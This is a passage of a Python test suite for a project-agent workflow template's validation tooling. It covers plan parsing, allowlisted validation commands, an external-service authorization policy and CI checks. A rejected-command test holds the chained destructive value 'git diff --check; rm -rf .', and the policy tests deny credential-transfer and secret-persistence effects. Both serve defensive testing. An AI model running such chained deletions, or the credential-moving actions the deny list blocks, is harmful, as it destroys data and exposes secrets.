#!/usr/bin/env python3
"""Focused tests for root and generated-project validation tooling."""

from __future__ import annotations

import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from types import ModuleType


ROOT = Path(__file__).resolve().parents[1]
PLAN_COMMAND_MODULES = (
    ROOT / "scripts/plan_validation_commands.py",
    ROOT / "template/.project-agent-workflow/scripts/plan_validation_commands.py",
)
VALIDATE_CHANGE_MODULES = (
    ROOT / "scripts/validate-changes.py",
    ROOT / "template/.project-agent-workflow/scripts/validate-changes.py",
)
SECURITY_RULE_MODULE = ROOT / "template/.project-agent-workflow/scripts/security_rules.py"
SECURITY_CHECK_MODULE = ROOT / "template/.project-agent-workflow/scripts/security-static-check.py"
LEGACY_MIGRATOR = ROOT / "template/.project-agent-workflow/scripts/migrate-legacy-template-files.py"
ROOT_EXTERNAL_SERVICE_CHECK = ROOT / "scripts/check-external-service-policy.py"
PLANLIB = ROOT / "template/.project-agent-workflow/scripts/planlib.py"


def load_module(path: Path, name: str) -> ModuleType:
    spec = importlib.util.spec_from_file_location(name, path)
    if spec is None or spec.loader is None:
        raise AssertionError(f"could not load module spec: {path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


class PlanValidationCommandsTest(unittest.TestCase):
    def test_planlib_parses_optional_focused_validation_without_requiring_it(self) -> None:
        module = load_module(PLANLIB, "focused_validation_planlib")
        with tempfile.TemporaryDirectory() as tmp:
            plan = Path(tmp) / "plan.md"
            plan.write_text(
                "status: in_progress\nvalidation:\n  - git diff --check\n"
                "focused_validation:\n  - python3 -m pytest tests/focused.py\n\n## Tasks\n",
                encoding="utf-8",
            )
            values = module.parse_manifest(plan)
            self.assertEqual(values["validation"], ["git diff --check"])
            self.assertEqual(values["focused_validation"], ["python3 -m pytest tests/focused.py"])
            plan.write_text(
                "status: in_progress\nvalidation:\n  - git diff --check\n\n## Tasks\n",
                encoding="utf-8",
            )
            self.assertEqual(module.parse_manifest(plan)["focused_validation"], [])

    def test_planlib_parses_optional_validation_authority_scope(self) -> None:
        module = load_module(PLANLIB, "validation_authority_planlib")
        with tempfile.TemporaryDirectory() as tmp:
            plan = Path(tmp) / "plan.md"
            plan.write_text(
                "validation_authority_scope:\n  - tools/\n\n## Tasks\n",
                encoding="utf-8",
            )
            self.assertEqual(module.parse_manifest(plan)["validation_authority_scope"], ["tools/"])

    def test_planlib_parses_optional_replan_lineage_without_requiring_it(self) -> None:
        module = load_module(PLANLIB, "replan_lineage_planlib")
        with tempfile.TemporaryDirectory() as tmp:
            plan = Path(tmp) / "plan.md"
            plan.write_text(
                "primary_invariant: preserve one invariant\n"
                "replan_source: docs/plan/active/001-source.md\n"
                "replan_contract: docs/plan/replanned/contracts/001-source.json\n"
                "integration_gates:\n  - combined acceptance\n"
                "successor_plans:\n  - docs/plan/active/002-successor.md\n"
                "inherited_acceptance_digests:\n  - sha256:" + "a" * 64 + "\n"
                "replan_reason_codes:\n  - multiple_independent_invariants\n\n## Tasks\n",
                encoding="utf-8",
            )
            values = module.parse_manifest(plan)
            self.assertEqual(values["primary_invariant"], "preserve one invariant")
            self.assertEqual(values["integration_gates"], ["combined acceptance"])
            self.assertEqual(
                values["inherited_acceptance_digests"], ["sha256:" + "a" * 64]
            )
            legacy = Path(tmp) / "legacy.md"
            legacy.write_text("status: in_progress\n\n## Tasks\n", encoding="utf-8")
            legacy_values = module.parse_manifest(legacy)
            self.assertEqual(legacy_values["replan_reason_codes"], [])
            self.assertEqual(module.manifest_scalar(legacy_values, "primary_invariant"), "")

    def test_title_does_not_hide_manifest_validation_commands(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            plan = Path(tmp) / "plan.md"
            plan.write_text(
                "# Plan title\n\nstatus: in_progress\nvalidation:\n"
                "  - npm run typecheck\n"
                "  - python3 -m pytest\n\n"
                "## Tasks\n\n- [ ] example\n",
                encoding="utf-8",
            )
            for index, module_path in enumerate(PLAN_COMMAND_MODULES):
                with self.subTest(module=module_path):
                    module = load_module(module_path, f"plan_validation_commands_{index}")
                    commands = module.check_plan(plan)
                    self.assertEqual(
                        [command.argv for command in commands],
                        [("npm", "run", "typecheck"), ("python3", "-m", "pytest")],
                    )

    def test_argv_rules_accept_declared_families_and_reject_expansion(self) -> None:
        common_accepted = (
            "git diff --cached --check",
            "npm run typecheck",
            "python3 -m pytest",
            "python3 -m pytest tests/test-validation-tools.py",
        )
        common_rejected = (
            "npm run prepublish",
            "python3 -m pytest -q",
            "python3 -m pytest ../outside.py",
            "git diff --check; rm -rf .",
        )
        for index, module_path in enumerate(PLAN_COMMAND_MODULES):
            module = load_module(module_path, f"plan_validation_rules_{index}")
            prefix = "scripts" if index == 0 else ".project-agent-workflow/scripts"
            accepted = (*common_accepted, f"python3 {prefix}/validate-changes.py --all --print-only --json")
            rejected = (*common_rejected, f"python3 {prefix}/validate-changes.py --all --staged")
            for command in accepted:
                with self.subTest(module=module_path, accepted=command):
                    module.parse_validation_command(command)
            for command in rejected:
                with self.subTest(module=module_path, rejected=command):
                    with self.assertRaises(module.ValidationCommandError):
                        module.parse_validation_command(command)

    def test_root_and_template_specific_commands_stay_separate(self) -> None:
        root_module = load_module(PLAN_COMMAND_MODULES[0], "root_plan_validation_commands")
        template_module = load_module(PLAN_COMMAND_MODULES[1], "template_plan_validation_commands")
        root_module.parse_validation_command("scripts/lint-project-workflow.sh")
        root_module.parse_validation_command("tests/smoke.sh")
        template_module.parse_validation_command(
            "python3 .project-agent-workflow/scripts/check-external-service-policy.py check"
        )
        template_module.parse_validation_command(".project-agent-workflow/scripts/check-agent-completion.sh")
        with self.assertRaises(root_module.ValidationCommandError):
            root_module.parse_validation_command("python3 scripts/check-external-service-policy.py check")
        with self.assertRaises(template_module.ValidationCommandError):
            template_module.parse_validation_command("tests/smoke.sh")

    def test_root_accepts_bounded_workflow_behavior_tests(self) -> None:
        root_module = load_module(PLAN_COMMAND_MODULES[0], "root_behavior_tests")
        for command in (
            "python3 tests/test-plan-restructure.py",
            "python3 tests/test-plan-execution-state.py",
            "python3 tests/test-sandboxed-plan-worker.py",
            "python3 tests/test-validation-tools.py",
            "python3 scripts/run-sandboxed-plan-worker.py self-test",
            "python3 scripts/check-copier-template.py",
            "tests/copier-update.sh --require-copier",
        ):
            with self.subTest(command=command):
                root_module.parse_validation_command(command)

    def test_copier_update_required_mode_rejects_an_unavailable_cli(self) -> None:
        environment = os.environ.copy()
        environment["PATH"] = "/usr/bin:/bin"
        environment.pop("REQUIRE_COPIER", None)
        result = subprocess.run(
            [str(ROOT / "tests/copier-update.sh"), "--require-copier"],
            cwd=ROOT,
            env=environment,
            check=False,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        self.assertEqual(result.returncode, 127)
        self.assertIn("copier CLI not found", result.stderr)

    def test_template_accepts_namespaced_hook_and_script_compilation(self) -> None:
        template_module = load_module(PLAN_COMMAND_MODULES[1], "template_namespaced_compile")
        template_module.parse_validation_command(
            "python3 -m py_compile "
            ".project-agent-workflow/hooks/stop_review_gate.py "
            ".project-agent-workflow/scripts/validate-changes.py"
        )
        template_module.parse_validation_command(
            "python3 .project-agent-workflow/scripts/security-static-check.py --changed"
        )
        template_module.parse_validation_command(
            "python3 .project-agent-workflow/scripts/security-static-check.py --managed"
        )

    def test_root_accepts_namespaced_template_shell_syntax_check(self) -> None:
        root_module = load_module(PLAN_COMMAND_MODULES[0], "root_namespaced_shell")
        root_module.parse_validation_command(
            "sh -n template/.project-agent-workflow/scripts/check-agent-completion.sh"
        )
        root_module.parse_validation_command(
            "python3 -m py_compile .project-agent-workflow/hooks/stop_review_gate.py"
        )

    def test_template_lint_compatibility_uses_exact_v050_bridged_aliases(self) -> None:
        module = load_module(PLAN_COMMAND_MODULES[1], "template_legacy_plan_commands")
        commands = (
            "python3 scripts/check-external-service-policy.py check",
            "python3 scripts/check-codex-toml.py",
            "python3 scripts/lint-plan-docs.py",
            "python3 scripts/format-plan-docs.py --check",
            "python3 scripts/security-static-check.py",
            "python3 scripts/structure-map.py --check",
            "python3 scripts/validate-changes.py --all --print-only --json",
            "sh scripts/lint-plan-docs.sh",
            "sh scripts/format-plan-docs.sh --check",
            "sh scripts/check-agent-completion.sh",
            "scripts/lint-plan-docs.sh",
            "scripts/format-plan-docs.sh --check",
            "scripts/check-agent-completion.sh",
        )
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            bridged_paths = sorted(
                {
                    script
                    for command in commands
                    if (script := module.legacy_bridge_script(tuple(command.split()))) is not None
                }
            )
            manifest = repo / ".project-agent-workflow-migration/v1-pre-namespace/manifest.json"
            manifest.parent.mkdir(parents=True)
            manifest.write_text(
                json.dumps(
                    {
                        "bridged_legacy_cli_paths": bridged_paths,
                        "operation": "recopy_adoption",
                        "previous_ref": "v0.5.0",
                    }
                ),
                encoding="utf-8",
            )
            for command in commands:
                argv = tuple(command.split())
                script = module.legacy_bridge_script(argv)
                self.assertIsNotNone(script)
                assert script is not None
                bridge = repo / script
                managed = repo / ".project-agent-workflow/scripts" / bridge.name
                bridge.parent.mkdir(parents=True, exist_ok=True)
                managed.parent.mkdir(parents=True, exist_ok=True)
                managed.write_text("managed helper\n", encoding="utf-8")
                managed.chmod(0o755)
                content = (
                    module.python_bridge_content(bridge.name)
                    if bridge.suffix == ".py"
                    else module.shell_bridge_content(bridge.name)
                )
                bridge.write_text(content, encoding="utf-8")
                bridge.chmod(0o755)

                with self.subTest(compatible=command):
                    module.parse_validation_command(command, legacy_bridge_root=repo)
                    with self.assertRaises(module.ValidationCommandError):
                        module.parse_validation_command(command)

            manifest.write_text(
                json.dumps(
                    {
                        "bridged_legacy_cli_paths": [],
                        "operation": "recopy_adoption",
                        "previous_ref": "v0.5.0",
                    }
                ),
                encoding="utf-8",
            )
            with self.assertRaises(module.ValidationCommandError):
                module.parse_validation_command(
                    "python3 scripts/check-codex-toml.py",
                    legacy_bridge_root=repo,
                )
            manifest.write_text(
                json.dumps(
                    {
                        "bridged_legacy_cli_paths": bridged_paths,
                        "operation": "recopy_adoption",
                        "previous_ref": "v0.5.0",
                    }
                ),
                encoding="utf-8",
            )
            modified = repo / "scripts/lint-plan-docs.py"
            modified.write_text(modified.read_text(encoding="utf-8") + "# modified\n", encoding="utf-8")
            with self.assertRaises(module.ValidationCommandError):
                module.parse_validation_command(
                    "python3 scripts/lint-plan-docs.py",
                    legacy_bridge_root=repo,
                )
            with self.assertRaises(module.ValidationCommandError):
                module.parse_validation_command(
                    "python3 scripts/security-static-check.py --changed",
                    legacy_bridge_root=repo,
                )
            with self.assertRaises(module.ValidationCommandError):
                module.parse_validation_command(
                    "python3 scripts/plan_validation_commands.py --self-test",
                    legacy_bridge_root=repo,
                )
            direct_shell = repo / "scripts/check-agent-completion.sh"
            direct_shell.chmod(0o644)
            with self.assertRaises(module.ValidationCommandError):
                module.parse_validation_command(
                    "scripts/check-agent-completion.sh",
                    legacy_bridge_root=repo,
                )

    def test_run_plan_rejects_checked_archive_before_execution(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            archive = repo / "docs/plan/checked/2026/08/01-15/001-history.md"
            archive.parent.mkdir(parents=True)
            archive.write_text(
                "# History\n\nvalidation:\n  - git diff --check\n\n## Tasks\n",
                encoding="utf-8",
            )
            result = subprocess.run(
                [
                    sys.executable,
                    str(PLAN_COMMAND_MODULES[1]),
                    "run-plan",
                    str(archive),
                ],
                cwd=repo,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            self.assertEqual(result.returncode, 1)
            self.assertIn("run-plan requires a numbered active plan path", result.stderr)


class RootExternalServicePolicyTest(unittest.TestCase):
    @staticmethod
    def run_check(*args: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            [sys.executable, "-B", str(ROOT_EXTERNAL_SERVICE_CHECK), *args],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )

    def authorize(
        self,
        *,
        service: str = "github",
        access: str = "write",
        operation: str = "git.push",
        target: str = "rectaris/temp_project:refs/heads/release+candidate",
        effects: tuple[str, ...] = ("ordinary",),
        confirmed_target: str | None = None,
        confirmed_effects: tuple[str, ...] = (),
        provider_configured: bool = True,
        task_authorized: bool = True,
    ) -> subprocess.CompletedProcess[str]:
        command = ["authorize", service, access, operation]
        if provider_configured:
            command.append("--provider-configured")
        if task_authorized:
            command.append("--task-authorized")
        command.extend(["--target", target])
        for effect in effects:
            command.extend(["--effect", effect])
        if confirmed_target is not None:
            command.extend(["--confirmed-target", confirmed_target])
        for effect in confirmed_effects:
            command.extend(["--confirmed-effect", effect])
        return self.run_check(*command)

    def assert_rejected(self, *args: str) -> None:
        result = self.run_check(*args)
        self.assertNotEqual(result.returncode, 0, msg=result.stdout + result.stderr)

    def test_root_policy_check_and_ordinary_github_reads_and_writes(self) -> None:
        self.assertEqual(self.run_check("check").returncode, 0)
        self.assertEqual(self.authorize().returncode, 0)
        self.assertEqual(
            self.authorize(
                target="rectaris/temp_project:refs/tags/release+candidate",
            ).returncode,
            0,
        )
        self.assertEqual(
            self.authorize(
                access="read",
                operation="repository.read",
                target="rectaris/temp_project",
            ).returncode,
            0,
        )

    def test_github_public_writes_require_exact_effects_and_confirmation(self) -> None:
        pull_request_target = "rectaris/temp_project:refs/heads/dev+candidate->refs/heads/main"
        release_target = "rectaris/temp_project:release:v1.2.3"
        for operation, target in (
            ("pull_request.publish", pull_request_target),
            ("release.publish", release_target),
        ):
            with self.subTest(operation=operation):
                result = self.authorize(
                    operation=operation,
                    target=target,
                    effects=("public_communication",),
                    confirmed_target=target,
                    confirmed_effects=("public_communication",),
                )
                self.assertEqual(result.returncode, 0, msg=result.stderr)

        self.assert_rejected(
            *self.authorize_command(
                operation="pull_request.publish",
                target=pull_request_target,
                effects=("ordinary",),
            )
        )
        self.assert_rejected(
            *self.authorize_command(
                operation="git.push",
                target="rectaris/temp_project:refs/heads/main",
                effects=("public_communication",),
            )
        )
        self.assert_rejected(
            *self.authorize_command(
                operation="release.publish",
                target=release_target,
                effects=("public_communication",),
            )
        )
        self.assert_rejected(
            *self.authorize_command(
                operation="release.publish",
                target=release_target,
                effects=("public_communication",),
                confirmed_target=release_target,
            )
        )
        self.assert_rejected(
            *self.authorize_command(
                operation="release.publish",
                target=release_target,
                effects=("public_communication",),
                confirmed_target="rectaris/temp_project:release:other",
                confirmed_effects=("public_communication",),
            )
        )
        for effect in (
            "remote_delete",
            "financial_commitment",
            "production_change",
            "access_control_change",
        ):
            with self.subTest(effect=effect):
                target = "rectaris/temp_project"
                result = self.authorize(
                    operation=f"operation.{effect}",
                    target=target,
                    effects=(effect,),
                    confirmed_target=target,
                    confirmed_effects=(effect,),
                )
                self.assertEqual(result.returncode, 0, msg=result.stderr)

    def authorize_command(self, **kwargs: object) -> list[str]:
        service = str(kwargs.get("service", "github"))
        access = str(kwargs.get("access", "write"))
        operation = str(kwargs.get("operation", "git.push"))
        target = str(kwargs.get("target", "rectaris/temp_project:refs/heads/release+candidate"))
        effects = tuple(kwargs.get("effects", ("ordinary",)))
        confirmed_target = kwargs.get("confirmed_target")
        confirmed_effects = tuple(kwargs.get("confirmed_effects", ()))
        provider_configured = bool(kwargs.get("provider_configured", True))
        task_authorized = bool(kwargs.get("task_authorized", True))
        command = ["authorize", service, access, operation]
        if provider_configured:
            command.append("--provider-configured")
        if task_authorized:
            command.append("--task-authorized")
        command.extend(["--target", target])
        for effect in effects:
            command.extend(["--effect", str(effect)])
        if confirmed_target is not None:
            command.extend(["--confirmed-target", str(confirmed_target)])
        for effect in confirmed_effects:
            command.extend(["--confirmed-effect", str(effect)])
        return command

    def test_denied_effects_and_missing_runtime_facts_fail_closed(self) -> None:
        self.assert_rejected(*self.authorize_command(provider_configured=False))
        self.assert_rejected(*self.authorize_command(task_authorized=False))
        for effect in (
            "credential_material_transfer",
            "secret_persistence",
            "write_credentials_to_untrusted_code",
        ):
            with self.subTest(effect=effect):
                self.assert_rejected(
                    *self.authorize_command(
                        effects=(effect,),
                        confirmed_target="rectaris/temp_project:refs/heads/release+candidate",
                        confirmed_effects=(effect,),
                    )
                )
        self.assert_rejected(
            *self.authorize_command(
                effects=("ordinary", "public_communication"),
                confirmed_target="rectaris/temp_project:refs/heads/release+candidate",
                confirmed_effects=("ordinary", "public_communication"),
            )
        )

    def test_github_targets_use_exact_repository_and_git_ref_validation(self) -> None:
        for target in (
            "rectaris/temp_project:refs/heads/release+candidate",
            "rectaris/temp_project:refs/tags/release+candidate",
        ):
            with self.subTest(target=target):
                self.assertEqual(self.authorize(target=target).returncode, 0)
        rejected = (
            "rectaris/temp_project:refs/heads/release.",
            "rectaris/temp_project:refs/tags/release.",
            "rectaris/temp_project:refs/branches/release",
            "rectaris/temp_project:refs/tags/release:extra",
        )
        for target in rejected:
            with self.subTest(target=target):
                self.assert_rejected(*self.authorize_command(target=target))

        pull_request_targets = (
            "rectaris/temp_project:refs/heads/HEAD->refs/heads/main",
            "rectaris/temp_project:refs/heads/-dev->refs/heads/main",
            "rectaris/temp_project:refs/heads/dev->refs/heads/main.",
            "rectaris/temp_project:refs/tags/v1.2.3",
        )
        for target in pull_request_targets[:3]:
            with self.subTest(target=target):
                self.assert_rejected(
                    *self.authorize_command(
                        operation="pull_request.publish",
                        target=target,
                        effects=("public_communication",),
                        confirmed_target=target,
                        confirmed_effects=("public_communication",),
                    )
                )
        self.assert_rejected(
            *self.authorize_command(
                operation="pull_request.publish",
                target=pull_request_targets[3],
                effects=("public_communication",),
                confirmed_target=pull_request_targets[3],
                confirmed_effects=("public_communication",),
            )
        )
        release_invalid_target = "rectaris/temp_project:release:v1.2.3."
        self.assert_rejected(
            *self.authorize_command(
                operation="release.publish",
                target=release_invalid_target,
                effects=("public_communication",),
                confirmed_target=release_invalid_target,
                confirmed_effects=("public_communication",),
            )
        )
        self.assert_rejected(
            *self.authorize_command(
                service="gh",
                operation="git.push",
            )
        )
        self.assert_rejected(
            *self.authorize_command(
                operation="git.push",
                target="other/repository:refs/heads/main",
            )
        )

    def test_root_rejects_empty_and_whitespace_only_operation_and_target(self) -> None:
        for operation in ("", " \t"):
            with self.subTest(operation=repr(operation)):
                self.assert_rejected(*self.authorize_command(operation=operation))
        for target in ("", " \t"):
            with self.subTest(target=repr(target)):
                self.assert_rejected(*self.authorize_command(target=target))

    def test_root_rejects_unknown_options_help_policy_overrides_and_escaped_help(self) -> None:
        base = self.authorize_command()
        negative_commands = {
            "unknown authorize option": [*base, "--unknown"],
            "exact --policy": [*base, "--policy", "other-policy.yaml"],
            "--policy abbreviation": [*base, "--pol", "other-policy.yaml"],
            "authorize --help": ["authorize", "--help"],
            "authorize -h": ["authorize", "-h"],
            "option-like service": ["authorize", "--", "--help", "write", "git.push"],
            "escaped positional --help": ["authorize", "github", "write", "--", "--help"],
            "escaped positional -h": ["authorize", "github", "write", "--", "-h"],
        }
        for label, command in negative_commands.items():
            with self.subTest(label=label):
                self.assert_rejected(*command)
        for prefix_length in range(1, len("--policy")):
            with self.subTest(prefix=prefix_length):
                self.assert_rejected(*base, "--policy"[:prefix_length], "other-policy.yaml")


class ValidateChangesTest(unittest.TestCase):
    def test_all_mode_checks_staged_and_unstaged_whitespace(self) -> None:
        for index, (plan_path, validate_path) in enumerate(
            zip(PLAN_COMMAND_MODULES, VALIDATE_CHANGE_MODULES, strict=True)
        ):
            with self.subTest(module=validate_path):
                dependency = load_module(plan_path, "plan_validation_commands")
                sys.modules["plan_validation_commands"] = dependency
                module = load_module(validate_path, f"validate_changes_{index}")
                self.assertEqual(
                    module.select_commands(["README.md"], "all")[:2],
                    [
                        ["git", "diff", "--cached", "--check"],
                        ["git", "diff", "--check"],
                    ],
                )
                self.assertEqual(
                    module.select_commands(["README.md"], "staged")[:1],
                    [["git", "diff", "--cached", "--check"]],
                )

    def test_changed_files_exclude_migration_backup(self) -> None:
        for index, (plan_path, validate_path) in enumerate(
            zip(PLAN_COMMAND_MODULES, VALIDATE_CHANGE_MODULES, strict=True)
        ):
            with self.subTest(module=validate_path):
                dependency = load_module(plan_path, "plan_validation_commands")
                sys.modules["plan_validation_commands"] = dependency
                module = load_module(validate_path, f"validate_changes_migration_backup_{index}")

                def fake_git(args: list[str]) -> list[str]:
                    values = {
                        ("diff", "--cached", "--name-only"): [],
                        ("diff", "--name-only"): ["src/current.py"],
                        ("ls-files", "--others", "--exclude-standard"): [
                            ".project-agent-workflow-migration/v1-pre-namespace/scripts/old.sh",
                            "docs/current.md",
                        ],
                    }
                    return values.get(tuple(args), [])

                module.git = fake_git
                paths, mode = module.changed_files("all")
                self.assertEqual(paths, ["docs/current.md", "src/current.py"])
                self.assertEqual(mode, "all")

    def test_git_query_failure_is_reported_in_json(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            scripts = repo / "scripts"
            scripts.mkdir()
            for source in (ROOT / "scripts").glob("*.py"):
                shutil.copy2(source, scripts)
            subprocess.run(["git", "init", "-q"], cwd=repo, check=True)

            for validate_path in (
                scripts / "validate-changes.py",
                ROOT / "template/.project-agent-workflow/scripts/validate-changes.py",
            ):
                result = subprocess.run(
                    [sys.executable, "-B", str(validate_path), "--all", "--json"],
                    cwd=repo,
                    env={**os.environ, "GIT_DIR": str(repo / "missing-git-dir")},
                    text=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    check=False,
                )
                with self.subTest(validator=validate_path):
                    self.assertEqual(result.returncode, 1)
                    payload = json.loads(result.stdout)
                    self.assertEqual(payload["status"], "git_query_failed")
                    self.assertIn("git diff --cached --name-only", payload["error"])

    def test_managed_plan_validation_requires_managed_index(self) -> None:
        for index, (plan_path, validate_path) in enumerate(
            zip(PLAN_COMMAND_MODULES, VALIDATE_CHANGE_MODULES, strict=True)
        ):
            with self.subTest(module=validate_path), tempfile.TemporaryDirectory() as tmp:
                dependency = load_module(plan_path, "plan_validation_commands")
                sys.modules["plan_validation_commands"] = dependency
                module = load_module(validate_path, f"validate_changes_plan_format_{index}")
                repo = Path(tmp)
                plan_index = repo / "docs/plan/plan.md"
                plan_index.parent.mkdir(parents=True)
                module.ROOT = repo
                module.existing = lambda _path: True

                plan_index.write_text("# アクティブプラン\n\n既存プロジェクト形式\n", encoding="utf-8")
                legacy_commands = module.select_commands(["docs/plan/active/.gitkeep"], "all")
                self.assertFalse(
                    any(any(part.endswith("lint-plan-docs.py") for part in command) for command in legacy_commands)
                )
                self.assertFalse(
                    any(any(part.endswith("format-plan-docs.py") for part in command) for command in legacy_commands)
                )

                plan_index.write_text("# Active Plan\n\nNo active development items.\n", encoding="utf-8")
                managed_commands = module.select_commands(["docs/plan/active/.gitkeep"], "all")
                self.assertTrue(
                    any(any(part.endswith("lint-plan-docs.py") for part in command) for command in managed_commands)
                )
                self.assertTrue(
                    any(any(part.endswith("format-plan-docs.py") for part in command) for command in managed_commands)
                )

    def test_template_selects_external_service_policy_check(self) -> None:
        dependency = load_module(PLAN_COMMAND_MODULES[1], "plan_validation_commands")
        sys.modules["plan_validation_commands"] = dependency
        module = load_module(VALIDATE_CHANGE_MODULES[1], "template_validate_changes_external_service")
        managed_script = ".project-agent-workflow/scripts/check-external-service-policy.py"
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            policy = repo / "docs/agent/external-services.yaml"
            policy.parent.mkdir(parents=True)
            module.ROOT = repo
            module.existing = lambda path: path == managed_script
            command = ["python3", managed_script, "check"]

            policy.write_text("credential_env: LEGACY_TOKEN\n", encoding="utf-8")
            self.assertNotIn(
                command,
                module.select_commands(["docs/agent/external-services.yaml"], "all"),
            )

            policy.write_text(
                "version: 1\nauthentication: environment\ncredential_reference: CURRENT_TOKEN\n",
                encoding="utf-8",
            )
            self.assertIn(command, module.select_commands(["docs/agent/external-services.yaml"], "all"))
            self.assertIn(
                command,
                module.select_commands(
                    [".project-agent-workflow/docs/agent/SPEC_EXTERNAL_SERVICES.md"], "all"
                ),
            )
            self.assertIn(command, module.select_commands([managed_script], "all"))

            policy.write_text(
                "version: 2\n"
                "access_profile: task_scoped_default_allow\n"
                "provider_requirement: runtime_configured\n",
                encoding="utf-8",
            )
            self.assertIn(command, module.select_commands(["docs/agent/external-services.yaml"], "all"))

    def test_all_mode_runs_both_whitespace_checks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            scripts = repo / "scripts"
            scripts.mkdir()
            shutil.copy2(ROOT / "scripts/validate-changes.py", scripts)
            shutil.copy2(ROOT / "scripts/plan_validation_commands.py", scripts)
            staged = repo / "staged.md"
            unstaged = repo / "unstaged.md"
            staged.write_text("clean\n", encoding="utf-8")
            unstaged.write_text("clean\n", encoding="utf-8")
            subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
            subprocess.run(["git", "add", "."], cwd=repo, check=True)
            subprocess.run(
                [
                    "git",
                    "-c",
                    "user.name=Validation Test",
                    "-c",
                    "user.email=validation@example.invalid",
                    "commit",
                    "-qm",
                    "initial",
                ],
                cwd=repo,
                check=True,
            )

            staged.write_text("staged trailing whitespace \n", encoding="utf-8")
            subprocess.run(["git", "add", "staged.md"], cwd=repo, check=True)
            unstaged.write_text("unstaged trailing whitespace \n", encoding="utf-8")
            first = self.run_validate_all(repo)
            self.assertEqual(first.returncode, 2)
            first_result = json.loads(first.stdout)
            self.assertEqual(first_result["results"][0]["argv"], ["git", "diff", "--cached", "--check"])
            self.assertEqual(first_result["results"][0]["returncode"], 2)

            staged.write_text("staged clean\n", encoding="utf-8")
            subprocess.run(["git", "add", "staged.md"], cwd=repo, check=True)
            second = self.run_validate_all(repo)
            self.assertEqual(second.returncode, 2)
            second_result = json.loads(second.stdout)
            self.assertEqual(
                [result["argv"] for result in second_result["results"]],
                [
                    ["git", "diff", "--cached", "--check"],
                    ["git", "diff", "--check"],
                ],
            )
            self.assertEqual(second_result["results"][0]["returncode"], 0)
            self.assertEqual(second_result["results"][1]["returncode"], 2)

    def test_no_change_fixture_remains_git_clean(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            scripts = repo / "scripts"
            scripts.mkdir()
            shutil.copy2(ROOT / "scripts/validate-changes.py", scripts)
            shutil.copy2(ROOT / "scripts/plan_validation_commands.py", scripts)
            subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
            subprocess.run(["git", "add", "."], cwd=repo, check=True)
            subprocess.run(
                [
                    "git",
                    "-c",
                    "user.name=Validation Test",
                    "-c",
                    "user.email=validation@example.invalid",
                    "commit",
                    "-qm",
                    "initial",
                ],
                cwd=repo,
                check=True,
            )

            result = subprocess.run(
                [sys.executable, "-B", "scripts/validate-changes.py", "--all", "--json"],
                cwd=repo,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            self.assertEqual(result.returncode, 0)
            self.assertEqual(json.loads(result.stdout)["status"], "no_changes")
            status = subprocess.run(
                ["git", "status", "--porcelain"],
                cwd=repo,
                text=True,
                stdout=subprocess.PIPE,
                check=True,
            )
            self.assertEqual(status.stdout, "")

    @staticmethod
    def run_validate_all(repo: Path) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            ["python3", "scripts/validate-changes.py", "--all", "--json"],
            cwd=repo,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )


class GeneratedCiTest(unittest.TestCase):
    def test_generated_workflow_is_namespaced_and_workflow_scoped(self) -> None:
        root_workflow = (ROOT / ".github/workflows/ci.yml").read_text(encoding="utf-8")
        workflow = (ROOT / "template/.github/workflows/project-agent-workflow.yml").read_text(encoding="utf-8")
        self.assertIn('git diff --check "$BASE_SHA...$PR_HEAD_SHA"', root_workflow)
        self.assertIn('[ "$REF_TYPE" = tag ]', root_workflow)
        self.assertIn('git diff --check "$HEAD_SHA^..$HEAD_SHA"', root_workflow)
        self.assertIn('git diff --check "$BEFORE_SHA..$HEAD_SHA"', root_workflow)
        self.assertIn('git diff --check "$EMPTY_TREE" "$HEAD_SHA"', root_workflow)
        self.assertIn('name: Project agent workflow', workflow)
        self.assertIn('      - ".project-agent-workflow/**"', workflow)
        self.assertIn('python3 .project-agent-workflow/scripts/lint-plan-docs.py', workflow)
        self.assertIn('python3 .project-agent-workflow/scripts/security-static-check.py --managed', workflow)
        self.assertNotIn('npm run test', workflow)
        self.assertIn("fetch-depth: 0", workflow)

    def test_empty_tree_range_checks_the_full_initial_push_tree(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
            bad = repo / "bad.md"
            bad.write_text("trailing whitespace \n", encoding="utf-8")
            subprocess.run(["git", "add", "bad.md"], cwd=repo, check=True)
            self.commit(repo, "first")
            (repo / "clean.md").write_text("clean\n", encoding="utf-8")
            subprocess.run(["git", "add", "clean.md"], cwd=repo, check=True)
            self.commit(repo, "second")
            empty_tree = subprocess.run(
                ["git", "hash-object", "-t", "tree", "/dev/null"],
                cwd=repo,
                text=True,
                stdout=subprocess.PIPE,
                check=True,
            ).stdout.strip()
            result = subprocess.run(
                ["git", "diff", "--check", empty_tree, "HEAD"],
                cwd=repo,
                text=True,
                stdout=subprocess.PIPE,
                check=False,
            )
            self.assertEqual(result.returncode, 2)
            self.assertIn("bad.md:1: trailing whitespace", result.stdout)

    def test_tag_range_checks_only_the_tagged_commit(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
            historical = repo / "historical.md"
